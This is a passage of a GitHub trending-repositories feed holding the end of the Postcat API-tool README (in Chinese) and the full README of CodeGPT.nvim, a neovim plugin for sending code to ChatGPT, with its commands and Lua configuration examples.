&#xA;&lt;p&gt;&lt;strong&gt;Postcat&lt;/strong&gt; 现在已经支持 Windows、Mac、Linux等系统，你可以通过以下地址访问并下载。同时我们也提供了 Web 端，方便你在任何浏览器上使用。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://postcat.com//&#34;&gt;https://postcat.com/&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;如果您试用之后觉得不错，&lt;strong&gt;请给我们的Postcat一个 Star 和 Fork~&lt;/strong&gt;你的支持是我们不断改进产品的动力！&lt;/p&gt; &#xA;&lt;h2&gt;详细的文档&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.postcat.com/&#34;&gt;Postcat 文档&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://developer.postcat.com/api/get-started.html&#34;&gt;插件开发文档&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;功能特性和迭代计划（Roadmap）&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;🚀 多协议支持&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;-- 已实现：HTTP REST、Websocket&lt;/p&gt; &#xA;&lt;p&gt;-- 即将实现：GraphQL、TCP、UDP、gRPC&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;📕 API 文档&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;✨ API 设计&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;⚡ API 测试&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;🎭 Mock&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;🙌 团队协作&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;🎈 文档分享&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;🗺 环境&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;🧶 全局变量&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;🧩 自定义主题风格&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;🌐 多语言支持：中文、English&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;了解更多具体迭代计划：&lt;a href=&#34;https://github.com/orgs/Postcatlab/projects/3&#34;&gt;Github Project&lt;/a&gt; &lt;br&gt;也欢迎给我们多多提需求~ &lt;br&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Bug 和需求反馈&lt;/h2&gt; &#xA;&lt;p&gt;如果想要反馈 Bug、提供产品意见，可以创建一个 &lt;a href=&#34;https://github.com/Postcatlab/postcat/issues&#34;&gt;Github issue&lt;/a&gt; 联系我们，十分感谢！&lt;/p&gt; &#xA;&lt;p&gt;如果您希望和 Postcat 团队近距离交流，讨论产品使用技巧以及了解更多产品最新进展，欢迎加入以下渠道。&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;QQ群号码：981965807&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;QQ群链接：&lt;a href=&#34;https://jq.qq.com/?_wv=1027&amp;amp;k=Kej1qTUy&#34;&gt;加入Postcat 用户群&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;微信群：&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://data.eolinker.com/course/NKhRRF668370911c8b8ea8a0887b5d62e71b0f1a22ad76a.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;开发 Postcat&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;运行代码&lt;/summary&gt; &#xA; &lt;br&gt; &#xA; &lt;p&gt;请确保你已经部署好所需的开发环境：&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;Node.js &amp;gt;= 14.17.x&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;yarn &amp;gt;= 1.22.x&lt;/p&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;我们在开发和构建时使用 yarn 作为包管理工具，强烈建议你也这么做，但如果您希望使用 npm 也完全没问题，只是在安装依赖时可能需要多花一些时间。&lt;/p&gt; &#xA; &lt;h3&gt;运行桌面端程序&lt;/h3&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&#xA;yarn install&#xA;&#xA;yarn start&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;h3&gt;运行浏览器程序&lt;/h3&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&#xA;cd src/workbench/browser&amp;amp;&amp;amp;npm install&#xA;&#xA;yarn start&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;h3&gt;提高效率&lt;/h3&gt; &#xA; &lt;p&gt;如果想提高开发效率，可以安装 Angular 官方提供的命令行 Angular-cli 快速生成组件、服务等模板。&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;&#xA;yarn add @angular/cli --global&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;内置命令&lt;/summary&gt; &#xA; &lt;h3&gt;运行命令&lt;/h3&gt; &#xA; &lt;p&gt;|命令 |描述 |&lt;/p&gt; &#xA; &lt;p&gt;| ------------ | ------------ |&lt;/p&gt; &#xA; &lt;p&gt;|yarn start |开发模式下，同时运行在浏览器和桌面端 |&lt;/p&gt; &#xA; &lt;p&gt;|yarn start:web |仅运行在浏览器,同时开启后端代理 |&lt;/p&gt; &#xA; &lt;p&gt;|yarn start:electron|仅运行在桌面端 |&lt;/p&gt; &#xA; &lt;h3&gt;打包构建&lt;/h3&gt; &#xA; &lt;p&gt;|命令 |描述 |&lt;/p&gt; &#xA; &lt;p&gt;| ------------ | ------------ |&lt;/p&gt; &#xA; &lt;p&gt;|sudo yarn build|各系统打包 Electron 应用 |&lt;/p&gt; &#xA; &lt;h3&gt;运行测试&lt;/h3&gt; &#xA; &lt;p&gt;|命令 |描述 |&lt;/p&gt; &#xA; &lt;p&gt;| ------------ | ------------ |&lt;/p&gt; &#xA; &lt;p&gt;|yarn test |执行单元测试 |&lt;/p&gt; &#xA; &lt;p&gt;&amp;lt;/d&lt;/p&gt; &#xA;&lt;/details&gt;</summary>
  </entry>
  <entry>
    <title>dpayne/CodeGPT.nvim</title>
    <updated>2023-03-11T01:29:21Z</updated>
    <id>tag:github.com,2023-03-11:/dpayne/CodeGPT.nvim</id>
    <link href="https://github.com/dpayne/CodeGPT.nvim" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CodeGPT.nvim&lt;/h1&gt; &#xA;&lt;p&gt;CodeGPT a plugin for neovim that provides commands to interact with ChatGPT. The focus is around code related usages, so code completion, refactorings, generating docs, etc.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Set environment variable &lt;code&gt;OPENAI_API_KEY&lt;/code&gt; to your &lt;a href=&#34;https://platform.openai.com/account/api-keys&#34;&gt;openai api key&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The plugins plenary and nui are also required.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Installing with packer.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;use(&#34;nvim-lua/plenary.nvim&#34;)&#xA;use(&#34;MunifTanjim/nui.nvim&#34;)&#xA;use(&#34;dpayne/CodeGPT.nvim&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Installing with plugged.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-vim&#34;&gt;Plug(&#34;nvim-lua/plenary.nvim&#34;)&#xA;Plug(&#34;MunifTanjim/nui.nvim&#34;)&#xA;Plug(&#34;dpayne/CodeGPT.nvim&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Commands&lt;/h2&gt; &#xA;&lt;p&gt;The top-level command is &lt;code&gt;:Chat&lt;/code&gt;. The behavior is different depending on whether text is selected and/or arguments are passed.&lt;/p&gt; &#xA;&lt;h3&gt;Completion&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;:Chat&lt;/code&gt; with text selection will trigger the &lt;code&gt;completion&lt;/code&gt; command, ChatGPT will try to complete the selected code snippet. &lt;img src=&#34;https://raw.githubusercontent.com/dpayne/CodeGPT.nvim/master/examples/completion.gif?raw=true&#34; alt=&#34;completion&#34;&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Code Edit&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;:Chat some instructions&lt;/code&gt; with text selection and command args will invoke the &lt;code&gt;code_edit&lt;/code&gt; command. This will treat the command args as instructions on what to do with the code snippet. In the below example, &lt;code&gt;:Chat refactor to use iteration&lt;/code&gt; will apply the instruction &lt;code&gt;refactor to use iteration&lt;/code&gt; to the selected code. &lt;img src=&#34;https://raw.githubusercontent.com/dpayne/CodeGPT.nvim/master/examples/code_edit.gif?raw=true&#34; alt=&#34;code_edit&#34;&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Code Edit&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;:Chat &amp;lt;command&amp;gt;&lt;/code&gt; if there is only one argument and that argument matches a command, it will invoke that command with the given text selection. In the below example &lt;code&gt;:Chat tests&lt;/code&gt; will attempt to write units for the selected code. &lt;img src=&#34;https://raw.githubusercontent.com/dpayne/CodeGPT.nvim/master/examples/tests.gif?raw=true&#34; alt=&#34;tests&#34;&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Chat&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;:Chat hello world&lt;/code&gt; without any text selection will trigger the &lt;code&gt;chat&lt;/code&gt; command. This will send the arguments &lt;code&gt;hello world&lt;/code&gt; to ChatGPT and show the results in a popup. &lt;img src=&#34;https://raw.githubusercontent.com/dpayne/CodeGPT.nvim/master/examples/chat.gif?raw=true&#34; alt=&#34;chat&#34;&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;A full list of predefined commands are below&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;command&lt;/th&gt; &#xA;   &lt;th&gt;input&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;completion&lt;/td&gt; &#xA;   &lt;td&gt;text selection&lt;/td&gt; &#xA;   &lt;td&gt;Will ask ChatGPT to complete the selected code.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;code_edit&lt;/td&gt; &#xA;   &lt;td&gt;text selection and command args&lt;/td&gt; &#xA;   &lt;td&gt;Will ask ChatGPT to apply the given instructions (the command args) to the selected code.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;explain&lt;/td&gt; &#xA;   &lt;td&gt;text selection&lt;/td&gt; &#xA;   &lt;td&gt;Will ask ChatGPT to explain the selected code.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;doc&lt;/td&gt; &#xA;   &lt;td&gt;text selection&lt;/td&gt; &#xA;   &lt;td&gt;Will ask ChatGPT to document the selected code.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;opt&lt;/td&gt; &#xA;   &lt;td&gt;text selection&lt;/td&gt; &#xA;   &lt;td&gt;Will ask ChatGPT to optimize the selected code.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;tests&lt;/td&gt; &#xA;   &lt;td&gt;text selection&lt;/td&gt; &#xA;   &lt;td&gt;Will ask ChatGPT to write unit tests for the selected code.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;chat&lt;/td&gt; &#xA;   &lt;td&gt;command args&lt;/td&gt; &#xA;   &lt;td&gt;Will pass the given command args to ChatGPT and return the response in a popup.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Overriding Command Configurations&lt;/h2&gt; &#xA;&lt;p&gt;The configuration option &lt;code&gt;vim.g[&#34;codegpt_commands_defaults&#34;] = {}&lt;/code&gt; can be used to override command configurations. This is a lua table with a list of commands and the options you want to override.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;vim.g[&#34;codegpt_commands_defaults&#34;] = {&#xA;  [&#34;completion&#34;] = {&#xA;      user_message_template = &#34;This is a template of the message passed to chat gpt. Hello, the code snippet is {{text_selection}}.&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The above, overrides the message template for the &lt;code&gt;completion&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;A full list of overrides&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;name&lt;/th&gt; &#xA;   &lt;th&gt;default&lt;/th&gt; &#xA;   &lt;th&gt;description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;model&lt;/td&gt; &#xA;   &lt;td&gt;&#34;gpt-3.5-turbo&#34;&lt;/td&gt; &#xA;   &lt;td&gt;The model to use.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;max_tokens&lt;/td&gt; &#xA;   &lt;td&gt;4096&lt;/td&gt; &#xA;   &lt;td&gt;The maximum number of tokens to use including the prompt tokens.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;temperature&lt;/td&gt; &#xA;   &lt;td&gt;0.6&lt;/td&gt; &#xA;   &lt;td&gt;0 -&amp;gt; 1, what sampling temperature to use.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;system_message_template&lt;/td&gt; &#xA;   &lt;td&gt;&#34;&#34;&lt;/td&gt; &#xA;   &lt;td&gt;Helps set the behavior of the assistant.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;user_message_template&lt;/td&gt; &#xA;   &lt;td&gt;&#34;&#34;&lt;/td&gt; &#xA;   &lt;td&gt;Instructs the assistant.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;callback_type&lt;/td&gt; &#xA;   &lt;td&gt;&#34;replace_lines&#34;&lt;/td&gt; &#xA;   &lt;td&gt;Controls what the plugin does with the response&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;language_instructions&lt;/td&gt; &#xA;   &lt;td&gt;{}&lt;/td&gt; &#xA;   &lt;td&gt;A table of filetype =&amp;gt; instructions. The current buffer&#39;s filetype is used in this lookup. This is useful trigger different instructions for different languages.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;Language Instructions&lt;/h4&gt; &#xA;&lt;p&gt;Some commands have templates that use the &lt;code&gt;{{language_instructions}}&lt;/code&gt; macro to allow for additional instructions for specific &lt;a href=&#34;https://neovim.io/doc/user/filetype.html&#34;&gt;filetypes&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;vim.g[&#34;codegpt_commands_defaults&#34;] = {&#xA;  [&#34;completion&#34;] = {&#xA;      language_instructions = {&#xA;          cpp = &#34;Use trailing return type.&#34;,&#xA;      },&#xA;  }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The above adds a specific &lt;code&gt;Use trailing return type.&lt;/code&gt; to the command &lt;code&gt;completion&lt;/code&gt; for the filetype &lt;code&gt;cpp&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Custom Commands&lt;/h2&gt; &#xA;&lt;p&gt;Custom commands can be added to the &lt;code&gt;vim.g[&#34;codegpt_commands&#34;]&lt;/code&gt; configuration option to extend the available commands.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;vim.g[&#34;codegpt_commands&#34;] = {&#xA;  [&#34;modernize&#34;] = {&#xA;      user_message_template = &#34;I have the following {{language}} code: ```{{filetype}}\n{{text_selection}}```\nModernize the above code. Use current best practices. Only return the code snippet and comments. {{language_instructions}}&#34;,&#xA;      language_instructions = {&#xA;          cpp = &#34;Refactor the code to use trailing return type, and the auto keyword where applicable.&#34;,&#xA;      },&#xA;  }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The above configuration adds the command &lt;code&gt;:Chat modernize&lt;/code&gt; that attempts modernize the selected code snippet.&lt;/p&gt; &#xA;&lt;h2&gt;Command Defaults&lt;/h2&gt; &#xA;&lt;p&gt;The default command configuration is&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;{&#xA;    model = &#34;gpt-3.5-turbo&#34;,&#xA;    max_tokens = 4096,&#xA;    temperature = 0.6,&#xA;    number_of_choices = 1,&#xA;    system_message_template = &#34;&#34;,&#xA;    user_message_template = &#34;&#34;,&#xA;    callback_type = &#34;replace_lines&#34;,&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;More Configuration Options&lt;/h2&gt; &#xA;&lt;h3&gt;Disable wrapping of text in popup window&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;-- Disables wrapping the text in the popup window. Default is true.&#xA;vim.g[&#34;codegpt_wrap_popup_text&#34;] = false&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Move completion to popup window&lt;/h3&gt; &#xA;&lt;p&gt;For any command, you can override the callback type to move the completion to a popup window. An example below is for overring the &lt;code&gt;completion&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;require(&#34;codegpt.config&#34;)&#xA;&#xA;vim.g[&#34;codegpt_commands&#34;] = {&#xA;[&#34;completion&#34;] = {&#xA;    callback_type = &#34;code_popup&#34;,&#xA;},&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Miscellaneous Configuration Options&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;&#xA;-- Open API key and api endpoint&#xA;vim.g[&#34;codegpt_openai_api_key&#34;] = os.getenv(&#34;OPENAI_API_KEY&#34;)&#xA;vim.g[&#34;codegpt_chat_completions_url&#34;] = &#34;https://api.openai.com/v1/chat/completions&#34;&#xA;&#xA;-- clears visual selection after completion&#xA;vim.g[&#34;codegpt_clear_visual_selection&#34;] = true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Callback Types&lt;/h2&gt; &#xA;&lt;p&gt;Callback types controls what to do with the response&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;name&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;replace_lines&lt;/td&gt; &#xA;   &lt;td&gt;replaces the current lines with the response. If no text is selected it will insert the response at the cursor.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;text_popup&lt;/td&gt; &#xA;   &lt;td&gt;Will display the result in a text popup window.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;code_popup&lt;/td&gt; &#xA;   &lt;td&gt;Will display the results in a popup window with the filetype set to the filetype of the current buffer&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Template Variables&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;name&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;language&lt;/td&gt; &#xA;   &lt;td&gt;Programming language of the current buffer.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;filetype&lt;/td&gt; &#xA;   &lt;td&gt;filetype of the current buffer.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;text_selection&lt;/td&gt; &#xA;   &lt;td&gt;Any selected text.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;command_args&lt;/td&gt; &#xA;   &lt;td&gt;Command arguments.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;filetype_instructions&lt;/td&gt; &#xA;   &lt;td&gt;filetype specific instructions.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h1&gt;Example Configuration&lt;/h1&gt; &#xA;&lt;p&gt;Note CodeGPT should work without any configuration. This is an example configuration that shows some of the options available.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;&#xA;require(&#34;codegpt.config&#34;)&#xA;&#xA;-- Override the default chat completions url, this is useful to override when testing custom commands&#xA;-- vim.g[&#34;codegpt_chat_completions_url&#34;] = &#34;http://127.0.0.1:800/test&#34;&#xA;&#xA;vim.g[&#34;codegpt_commands&#34;] = {&#xA;  [&#34;tests&#34;] = {&#xA;    -- Language specific instructions for java filetype&#xA;    language_instructions = {&#xA;        java = &#34;Use the TestNG framework.&#34;,&#xA;    },&#xA;  },&#xA;  [&#34;doc&#34;] = {&#xA;    -- Language specific instructions for python filetype&#xA;    language_instructions = {&#xA;        python = &#34;Use the Google style docstrings.&#34;&#xA;    },&#xA;&#xA;    -- Overrides the max tokens to be 1024&#xA;    max_tokens = 1024,&#xA;  },&#xA;  [&#34;code_edit&#34;] = {&#xA;    -- Overrides the system message template&#xA;    system_message_template = &#34;You are {{language}} developer.&#34;,&#xA;&#xA;    -- Overrides the user message template&#xA;    user_message_template = &#34;I have the following {{language}} code: ```{{filetype}}\n{{text_selection}}```\nEdit the above code. {{language_instructions}}&#34;,&#xA;&#xA;    -- Display the response in a popup window. The popup window filetype will be the filetype of the current buffer.&#xA;    callback_type = &#34;code_popup&#34;,&#xA;  },&#xA;  -- Custom command&#xA;  [&#34;modernize&#34;] = {&#xA;    user_message_template = &#34;I have the following {{language}} code: ```{{filetype}}\n{{text_selection}}```\nModernize the above code. Use current best practices. Only return the code snippet and comments. {{language_instructions}}&#34;,&#xA;    language_instructions = {&#xA;        cpp = &#34;Use modern C++ syntax. Use auto where possible. Do not import std. Use trailing return type. Use the c++11, c++14, c++17, and c++20 standards where applicable.&#34;,&#xA;    },&#xA;  }&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Goals&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Code related usages&lt;/li&gt; &#xA; &lt;li&gt;Simple&lt;/li&gt; &#xA; &lt;li&gt;Easy to add custom commands&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>